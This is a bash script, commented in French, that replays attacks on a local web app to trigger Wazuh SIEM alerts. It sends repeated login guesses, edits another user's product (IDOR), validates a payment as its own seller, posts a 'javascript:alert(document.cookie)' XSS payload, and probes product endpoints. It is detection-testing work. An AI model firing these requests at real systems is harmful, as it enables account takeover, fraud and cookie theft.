#!/usr/bin/env bash
# Rejoue les scénarios d'attaque contre l'app locale pour déclencher les alertes Wazuh.
# Usage : siem/attack.sh bruteforce|idor|fraud|xss|scan
# Variables : BASE_URL (défaut http://localhost:3000), COOKIE (cookie de session de l'attaquant,
# copié depuis le navigateur), PRODUCT_ID (produit d'un autre utilisateur),
# PAYMENT_ID (paiement dont l'attaquant est le vendeur), CONVERSATION_ID.
set -euo pipefail
BASE_URL="${BASE_URL:-http://localhost:3000}"
need() { [ -n "${!1:-}" ] || { echo "Variable $1 requise pour ce scénario" >&2; exit 1; }; }
req() { curl -s -o /dev/null -w "%{http_code}\n" "$@"; }

case "${1:-}" in
  bruteforce) # -> 100101 x6, 100102 (T1110.001)
    # 11 s entre les essais : le compteur du rate limit better-auth sur /sign-in (3 requêtes)
    # ne repart à zéro qu'après 10 s sans requête, et les requêtes bloquées ne sont pas journalisées
    for i in $(seq 1 6); do
      req -X POST "$BASE_URL/api/auth/sign-in/email" -H "Content-Type: application/json" \
        -d "{\"email\":\"victime@example.com\",\"password\":\"essai$i\"}"
      sleep 11
    done ;;
  idor) # -> 100110 x5, 100111
    need COOKIE; need PRODUCT_ID
    for i in $(seq 1 5); do
      req -X PUT "$BASE_URL/api/products/$PRODUCT_ID" -H "Cookie: $COOKIE" \
        -H "Content-Type: application/json" -d '{"title":"pwned"}'
      sleep 3
    done ;;
  fraud) # -> 100120 (vendeur qui valide lui-même la réception)
    need COOKIE; need PAYMENT_ID
    req -X POST "$BASE_URL/api/payments/$PAYMENT_ID/buyer-validation" -H "Cookie: $COOKIE" \
      -H "Content-Type: application/json" -d '{"action":"accept"}' ;;
  xss) # -> 100130
    need COOKIE; need CONVERSATION_ID
    req -X POST "$BASE_URL/api/messages/send" -H "Cookie: $COOKIE" -H "Content-Type: application/json" \
      -d "{\"conversationId\":\"$CONVERSATION_ID\",\"messageType\":\"image\",\"content\":\"javascript:alert(document.cookie)\"}" ;;
  scan) # -> 100112 x12, 100131 (T1595) ; pour un vrai scan : zap.yaml
    for id in a b c d e f; do
      for m in PUT DELETE; do req -X "$m" "$BASE_URL/api/products/$id"; sleep 0.5; done
    done ;;
  *) echo "Usage : $0 bruteforce|idor|fraud|xss|scan" >&2; exit 1 ;;
esac
